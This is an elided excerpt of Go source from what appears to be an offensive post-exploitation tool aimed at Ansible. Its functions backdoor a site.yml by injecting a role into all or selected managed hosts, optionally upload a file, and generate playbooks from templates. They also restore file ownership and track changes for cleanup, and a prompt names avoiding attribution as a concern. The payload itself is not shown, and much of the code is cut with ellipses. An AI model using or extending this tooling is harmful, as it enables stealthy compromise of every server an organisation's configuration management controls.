...
func doCleanup(siteLoc string) {
	if _, err := moseutils.TrackChanges(cleanupFile, cleanupFile); err != nil {
	...
	if answer || ans2 {
		if err := system.CpFile(path, siteLoc); err != nil {
			log.Fatal().Err(err).Msg("Failed to restore backup")
		}
		if err := os.Remove(path); err != nil {
			log.Error().Err(err).Msg("Failed to remove backup file")
		}
	}
	os.Exit(0)
}
...
func getPlaybooks() []string {
	...
	for _, dir := range dirList {
		...
		if strings.Contains(d, "roles") && !strings.Contains(d, "~") &&
			...
			if _, ok := locations[d]; !ok && filepath.Base(d) == "roles" {
				locations[d] = struct{}{}
			}
		}
	}
...
func getHostFileFromCfg() (bool, string) {
	...
	for _, line := range cfgFile {
		...
		if matched {
			...
			if len(parts) < 2 {
				log.Error().Msgf("Unable to parse inventory line: %s", line)
				return false, ""
			}
			inventoryPath := strings.TrimSpace(parts[1])
...
func generatePlaybooks() {
	...
	for _, playbookDir := range files.playbookDirs {
		...
		templatePath := "/tmpl/ansiblePlaybook.tmpl"
		if uploadFileName != "" {
			templatePath = "/tmpl/ansibleFileUploadPlaybook.tmpl"
		}
		...
		// Parse the template
		t, err := template.New("ansiblePlaybook").Parse(templateContent)
		...
		if err := f.Close(); err != nil {
			log.Error().Err(err).Msg("Failed closing playbook file")
		}
...
func validateIndices(data ansible) map[int]bool {
	...
	for i, hosts := range data {
		...
		if hosts.Include == "" {
			for _, item := range hosts.Roles {
				...
				default:
					log.Debug().Msg("Should not make it here in validateIndices")
				}
			}
...
func backdoorSiteFile() {
	...
	if hasAllHosts(unmarshalled) {
		if handleAllHosts(&unmarshalled) {
			return
		}
	} else if handleMissingAllHosts(&unmarshalled) {
		return
	}

	log.Info().Msg("The following roles were found in the site.yml file: ")
	injectIntoSelectedRoles(unmarshalled)
	writeYamlToSite(unmarshalled)
}

func hasAllHosts(unmarshalled ansible) bool {
...
func handleAllHosts(unmarshalled *ansible) bool {
	log.Debug().Msg("hosts:all found")
	answer, err := moseutils.AskUserQuestion("Would you like to target all managed hosts? ", a.OsTarget)
	if err != nil {
		log.Fatal().Msg("Quitting...")
	}
	if !answer {
...
func handleMissingAllHosts(unmarshalled *ansible) bool {
	log.Debug().Msgf("No existing configuration for all founds host in %v", files.siteFile)
	roles := []interface{}{ansibleRole}
	answer, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget)
	if err != nil {
...
func injectIntoSelectedRoles(unmarshalled ansible) {
	validIndices := validateIndices(unmarshalled)
	answers, err := moseutils.IndexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndices, func() { validateIndices(unmarshalled) })
	if err != nil {
...
func main() {
	...
	handleUploadFile()
	storeSiteFileOwnership()
	discoverAnsibleFiles()
	maybeBackupSiteFile()
...
func handleUploadFile() {
	...
	if _, err := moseutils.TrackChanges(cleanupFile, uploadFileName); err != nil {
		log.Error().Err(err).Msgf("Error tracking changes: ")
	}
}

func storeSiteFileOwnership() {
...
func maybeBackupSiteFile() {
	if files.siteFile == "" {
		return
	}
	answer, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget)
	if err != nil {
...
func restoreSiteFileOwnership() {
	log.Debug().Msgf("Changing owner of the backup file to uid %v", files.uid)
	if files.uid == -1 || files.gid == -1 {
		return
	}
	if err := os.Chown(files.siteFile, files.uid, files.gid); err != nil {
